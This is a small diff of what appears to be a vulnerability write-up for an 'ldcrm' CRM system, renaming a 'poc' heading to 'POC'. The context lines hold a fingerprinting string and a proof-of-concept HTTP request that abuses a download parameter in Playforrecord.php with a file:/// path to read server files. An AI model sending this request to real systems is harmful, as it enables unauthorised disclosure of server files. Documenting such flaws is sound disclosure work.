@@ -8,7 +8,7 @@
 body="include/js/ldAjax.js"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /crm/modules/Accounts/Playforrecord.php?download=file:///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1
